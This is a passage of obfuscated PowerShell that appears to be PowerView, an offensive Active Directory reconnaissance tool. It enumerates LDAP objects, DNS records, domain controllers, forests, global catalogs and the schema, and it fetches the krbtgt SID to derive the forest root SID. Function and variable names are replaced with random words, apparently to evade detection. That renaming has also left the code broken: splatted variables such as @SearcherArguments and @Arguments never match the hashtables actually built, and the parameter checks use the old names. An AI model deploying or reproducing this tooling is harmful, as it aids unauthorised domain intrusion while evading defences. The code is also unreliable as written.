    $pwEfoKvn99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $kVUCshvC99[$_] = $pwEfoKvn99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $kVUCshvC99[$_] = $pwEfoKvn99[$_][0] -as $hlaZBoOG99
            }
            elseif ($_ -eq 'samaccounttype') {
                $kVUCshvC99[$_] = $pwEfoKvn99[$_][0] -as $qIGCLzdc99
            }
            elseif ($_ -eq 'objectguid') {
                $kVUCshvC99[$_] = (New-Object Guid (,$pwEfoKvn99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $kVUCshvC99[$_] = $pwEfoKvn99[$_][0] -as $uxoaxGDG99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $qcdhcwPi99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $pwEfoKvn99[$_][0], 0
                if ($qcdhcwPi99.Owner) {
                    $kVUCshvC99['Owner'] = $qcdhcwPi99.Owner
                }
                if ($qcdhcwPi99.Group) {
                    $kVUCshvC99['Group'] = $qcdhcwPi99.Group
                }
                if ($qcdhcwPi99.DiscretionaryAcl) {
                    $kVUCshvC99['DiscretionaryAcl'] = $qcdhcwPi99.DiscretionaryAcl
                }
                if ($qcdhcwPi99.SystemAcl) {
                    $kVUCshvC99['SystemAcl'] = $qcdhcwPi99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($pwEfoKvn99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $kVUCshvC99[$_] = "NEVER"
                }
                else {
                    $kVUCshvC99[$_] = [datetime]::fromfiletime($pwEfoKvn99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($pwEfoKvn99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $pwEfoKvn99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $kVUCshvC99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $kVUCshvC99[$_] = ([datetime]::FromFileTime(($pwEfoKvn99[$_][0])))
                }
            }
            elseif ($pwEfoKvn99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $pwEfoKvn99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $kVUCshvC99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[proletarian] error: $_"
                    $kVUCshvC99[$_] = $Prop[$_]
                }
            }
            elseif ($pwEfoKvn99[$_].count -eq 1) {
                $kVUCshvC99[$_] = $pwEfoKvn99[$_][0]
            }
            else {
                $kVUCshvC99[$_] = $pwEfoKvn99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $kVUCshvC99
    }
    catch {
        Write-Warning "[proletarian] Error parsing LDAP properties : $_"
    }
}
function Zimbabweans {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UFjPrIgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $hfELBeHx99 = $StsWGohF99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $GOrSdVAL99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $GOrSdVAL99) {
                    $fCjbNNqf99 = "$($ENV:LOGONSERVER -replace '\\','').$GOrSdVAL99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $AJNGaAMT99 = Md -DegNROrc99 $DegNROrc99
            $fCjbNNqf99 = ($AJNGaAMT99.PdcRoleOwner).Name
            $hfELBeHx99 = $AJNGaAMT99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $hfELBeHx99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $hfELBeHx99) {
                $fCjbNNqf99 = "$($ENV:LOGONSERVER -replace '\\','').$hfELBeHx99"
            }
        }
        else {
            write-verbose "get-domain"
            $AJNGaAMT99 = Md
            $fCjbNNqf99 = ($AJNGaAMT99.PdcRoleOwner).Name
            $hfELBeHx99 = $AJNGaAMT99.Name
        }
        if ($PSBoundParameters['Server']) {
            $fCjbNNqf99 = $sWbqYnBA99
        }
        $onMMjYsw99 = 'LDAP://'
        if ($fCjbNNqf99 -and ($fCjbNNqf99.Trim() -ne '')) {
            $onMMjYsw99 += $fCjbNNqf99
            if ($hfELBeHx99) {
                $onMMjYsw99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $onMMjYsw99 += $UFjPrIgW99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($sVFAWYQs99 -Match '^GC://') {
                $DN = $sVFAWYQs99.ToUpper().Trim('/')
                $onMMjYsw99 = ''
            }
            else {
                if ($sVFAWYQs99 -match '^LDAP://') {
                    if ($sVFAWYQs99 -match "LDAP://.+/.+") {
                        $onMMjYsw99 = ''
                        $DN = $sVFAWYQs99
                    }
                    else {
                        $DN = $sVFAWYQs99.SubString(7)
                    }
                }
                else {
                    $DN = $sVFAWYQs99
                }
            }
        }
        else {
            if ($hfELBeHx99 -and ($hfELBeHx99.Trim() -ne '')) {
                $DN = "DC=$($hfELBeHx99.Replace('.', ',DC='))"
            }
        }
        $onMMjYsw99 += $DN
        Write-Verbose "[Zimbabweans] search base: $onMMjYsw99"
        if ($DegNROrc99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Zimbabweans] Using alternate credentials for LDAP connection"
            $AJNGaAMT99 = New-Object DirectoryServices.DirectoryEntry($onMMjYsw99, $DegNROrc99.UserName, $DegNROrc99.GetNetworkCredential().Password)
            $MWKeDdKg99 = New-Object System.DirectoryServices.DirectorySearcher($AJNGaAMT99)
        }
        else {
            $MWKeDdKg99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$onMMjYsw99)
        }
        $MWKeDdKg99.PageSize = $jrZpVEwq99
        $MWKeDdKg99.SearchScope = $hZznjEbB99
        $MWKeDdKg99.CacheResults = $False
        $MWKeDdKg99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $MWKeDdKg99.ServerTimeLimit = $kkbrymyp99
        }
        if ($PSBoundParameters['Tombstone']) {
            $MWKeDdKg99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $MWKeDdKg99.filter = $YcLdsqIq99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $MWKeDdKg99.SecurityMasks = Switch ($FWquSvcy99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $RfWLlPmr99 = $pwEfoKvn99| ForEach-Object { $_.Split(',') }
            $Null = $MWKeDdKg99.PropertiesToLoad.AddRange(($RfWLlPmr99))
        }
        $MWKeDdKg99
    }
}
function shadowing {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $TzckrSvm99
    )
    BEGIN {
        function cadging {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$whSALpvl99 = $Raw[0]
            [Int]$xPZstgVi99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($xPZstgVi99-- -gt 0)
            {
                [Int]$FhDRpAWm99 = $Raw[$Index++]
                while ($FhDRpAWm99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $lwPFPQjl99 = [BitConverter]::ToUInt16($TzckrSvm99, 2)
        $alJiKNLl99 = [BitConverter]::ToUInt32($TzckrSvm99, 8)
        $iOhzyPzW99 = $TzckrSvm99[12..15]
        $Null = [array]::Reverse($iOhzyPzW99)
        $TTL = [BitConverter]::ToUInt32($iOhzyPzW99, 0)
        $Age = [BitConverter]::ToUInt32($TzckrSvm99, 20)
        if ($Age -ne 0) {
            $bEXzQadX99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $bEXzQadX99 = '[static]'
        }
        $lfEliJBM99 = New-Object PSObject
        if ($lwPFPQjl99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $TzckrSvm99[24], $TzckrSvm99[25], $TzckrSvm99[26], $TzckrSvm99[27]
            $Data = $IP
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($lwPFPQjl99 -eq 2) {
            $eUNrtXwP99 = cadging $TzckrSvm99[24..$TzckrSvm99.length]
            $Data = $eUNrtXwP99
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($lwPFPQjl99 -eq 5) {
            $Alias = cadging $TzckrSvm99[24..$TzckrSvm99.length]
            $Data = $Alias
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($lwPFPQjl99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($TzckrSvm99[24..$TzckrSvm99.length]))
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($lwPFPQjl99 -eq 12) {
            $Ptr = cadging $TzckrSvm99[24..$TzckrSvm99.length]
            $Data = $Ptr
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($lwPFPQjl99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($TzckrSvm99[24..$TzckrSvm99.length]))
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($lwPFPQjl99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($TzckrSvm99[24..$TzckrSvm99.length]))
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($lwPFPQjl99 -eq 16) {
            [string]$TXT  = ''
            [int]$FhDRpAWm99 = $TzckrSvm99[24]
            $Index = 25
            while ($FhDRpAWm99-- -gt 0) {
                $TXT += [char]$TzckrSvm99[$index++]
            }
            $Data = $TXT
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($lwPFPQjl99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($TzckrSvm99[24..$TzckrSvm99.length]))
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($lwPFPQjl99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($TzckrSvm99[24..$TzckrSvm99.length]))
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($TzckrSvm99[24..$TzckrSvm99.length]))
            $lfEliJBM99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $lfEliJBM99 | Add-Member Noteproperty 'UpdatedAtSerial' $alJiKNLl99
        $lfEliJBM99 | Add-Member Noteproperty 'TTL' $TTL
        $lfEliJBM99 | Add-Member Noteproperty 'Age' $Age
        $lfEliJBM99 | Add-Member Noteproperty 'TimeStamp' $bEXzQadX99
        $lfEliJBM99 | Add-Member Noteproperty 'Data' $Data
        $lfEliJBM99
    }
}
function salvages {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $cODXoeui99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $DxnDIeSy99 = Zimbabweans @SearcherArguments
        if ($DxnDIeSy99) {
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $DxnDIeSy99.FindOne()  }
            else { $oboKDFwv99 = $DxnDIeSy99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                $Out = proletarian -pwEfoKvn99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[debonair] Error disposing of the Results object: $_"
                }
            }
            $DxnDIeSy99.dispose()
        }
        $cODXoeui99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $PZovIgUw99 = Zimbabweans @SearcherArguments
        if ($PZovIgUw99) {
            try {
                if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $PZovIgUw99.FindOne() }
                else { $oboKDFwv99 = $PZovIgUw99.FindAll() }
                $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                    $Out = proletarian -pwEfoKvn99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($oboKDFwv99) {
                    try { $oboKDFwv99.dispose() }
                    catch {
                        Write-Verbose "[salvages] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[salvages] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $PZovIgUw99.dispose()
        }
    }
}
function dwarfish {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $fBlsqqNr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $cODXoeui99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($fBlsqqNr99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $kpVgDeuj99 = Zimbabweans @SearcherArguments
        if ($kpVgDeuj99) {
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $kpVgDeuj99.FindOne() }
            else { $oboKDFwv99 = $kpVgDeuj99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = proletarian -pwEfoKvn99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $fBlsqqNr99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $HoGfREok99 = shadowing -TzckrSvm99 $Out.dnsrecord[0]
                    }
                    else {
                        $HoGfREok99 = shadowing -TzckrSvm99 $Out.dnsrecord
                    }
                    if ($HoGfREok99) {
                        $HoGfREok99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[dwarfish] Error: $_"
                    $Out
                }
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[dwarfish] Error disposing of the Results object: $_"
                }
            }
            $kpVgDeuj99.dispose()
        }
    }
}
function Md {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[Md] Using alternate credentials for Md'
            if ($PSBoundParameters['Domain']) {
                $hfELBeHx99 = $StsWGohF99
            }
            else {
                $hfELBeHx99 = $DegNROrc99.GetNetworkCredential().Domain
                Write-Verbose "[Md] Extracted domain '$hfELBeHx99' from -DegNROrc99"
            }
            $PiALsTVY99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $hfELBeHx99, $DegNROrc99.UserName, $DegNROrc99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($PiALsTVY99)
            }
            catch {
                Write-Verbose "[Md] The specified domain '$hfELBeHx99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $PiALsTVY99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $StsWGohF99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($PiALsTVY99)
            }
            catch {
                Write-Verbose "[Md] The specified domain '$StsWGohF99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Md] Error retrieving the current domain: $_"
            }
        }
    }
}
function skyrockets {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $iyRTtIdT99 = @{}
        if ($PSBoundParameters['Domain']) { $iyRTtIdT99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Credential']) { $iyRTtIdT99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $iyRTtIdT99['Server'] = $sWbqYnBA99 }
            $iyRTtIdT99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            snivel @Arguments
        }
        else {
            $WiwtkvNl99 = Md @Arguments
            if ($WiwtkvNl99) {
                $WiwtkvNl99.DomainControllers
            }
        }
    }
}
function songsters {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UpdiKnQa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[songsters] Using alternate credentials for songsters"
            if ($PSBoundParameters['Forest']) {
                $NpqvEESm99 = $UpdiKnQa99
            }
            else {
                $NpqvEESm99 = $DegNROrc99.GetNetworkCredential().Domain
                Write-Verbose "[songsters] Extracted domain '$UpdiKnQa99' from -DegNROrc99"
            }
            $QEqpvQrG99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $NpqvEESm99, $DegNROrc99.UserName, $DegNROrc99.GetNetworkCredential().Password)
            try {
                $KZLPeYin99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($QEqpvQrG99)
            }
            catch {
                Write-Verbose "[songsters] The specified forest '$NpqvEESm99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $QEqpvQrG99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $UpdiKnQa99)
            try {
                $KZLPeYin99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($QEqpvQrG99)
            }
            catch {
                Write-Verbose "[songsters] The specified forest '$UpdiKnQa99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $KZLPeYin99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($KZLPeYin99) {
            if ($PSBoundParameters['Credential']) {
                $AexUcUGL99 = (Lille -FMEdvzGY99 "krbtgt" -StsWGohF99 $KZLPeYin99.RootDomain.Name -DegNROrc99 $DegNROrc99).objectsid
            }
            else {
                $AexUcUGL99 = (Lille -FMEdvzGY99 "krbtgt" -StsWGohF99 $KZLPeYin99.RootDomain.Name).objectsid
            }
            $Parts = $AexUcUGL99 -Split '-'
            $AexUcUGL99 = $Parts[0..$($Parts.length-2)] -join '-'
            $KZLPeYin99 | Add-Member NoteProperty 'RootDomainSid' $AexUcUGL99
            $KZLPeYin99
        }
    }
}
function halos {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UpdiKnQa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $iyRTtIdT99 = @{}
        if ($PSBoundParameters['Forest']) { $iyRTtIdT99['Forest'] = $UpdiKnQa99 }
        if ($PSBoundParameters['Credential']) { $iyRTtIdT99['Credential'] = $DegNROrc99 }
        $KZLPeYin99 = songsters @Arguments
        if ($KZLPeYin99) {
            $KZLPeYin99.Domains
        }
    }
}
function archeology {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UpdiKnQa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $iyRTtIdT99 = @{}
        if ($PSBoundParameters['Forest']) { $iyRTtIdT99['Forest'] = $UpdiKnQa99 }
        if ($PSBoundParameters['Credential']) { $iyRTtIdT99['Credential'] = $DegNROrc99 }
        $KZLPeYin99 = songsters @Arguments
        if ($KZLPeYin99) {
            $KZLPeYin99.FindAllGlobalCatalogs()
        }
    }
}
function slim {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $seaFVLzL99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UpdiKnQa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $iyRTtIdT99 = @{}
        if ($PSBoundParameters['Forest']) { $iyRTtIdT99['Forest'] = $UpdiKnQa99 }
        if ($PSBoundParameters['Credential']) { $iyRTtIdT99['Credential'] = $DegNROrc99 }
        $KZLPeYin99 = songsters @Arguments
        if ($KZLPeYin99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($kQOQcRYy99 in $seaFVLzL99) {
                    $KZLPeYin99.Schema.FindClass($kQOQcRYy99)
                }
            }
            else {
                $KZLPeYin99.Schema.FindAllClasses()
            }
        }
    }
}
function timbre {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $seaFVLzL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $EyszHYHf99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $TNdhapTZ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
